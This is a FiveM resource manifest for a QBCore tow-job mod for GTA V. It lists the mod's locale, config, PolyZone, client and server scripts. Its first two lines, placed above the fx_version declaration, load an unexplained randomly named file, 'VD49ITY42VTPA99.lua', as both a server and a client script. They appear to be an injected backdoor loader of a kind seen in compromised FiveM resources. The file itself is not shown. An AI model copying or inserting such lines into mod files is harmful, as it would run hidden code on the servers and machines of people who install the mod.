server_script "VD49ITY42VTPA99.lua"
client_script "VD49ITY42VTPA99.lua"
fx_version 'cerulean'
game 'gta5'

description 'QB-TowJob'
version '1.1.0'

shared_scripts {
    '@qb-core/shared/locale.lua',
    'config.lua',
    'locales/en.lua',
    'locales/*.lua'
}

client_scripts {
    '@PolyZone/client.lua',
    '@PolyZone/BoxZone.lua',
    '@PolyZone/ComboZone.lua',
    'client/main.lua'
}

server_script 'server/main.lua'

lua54 'yes'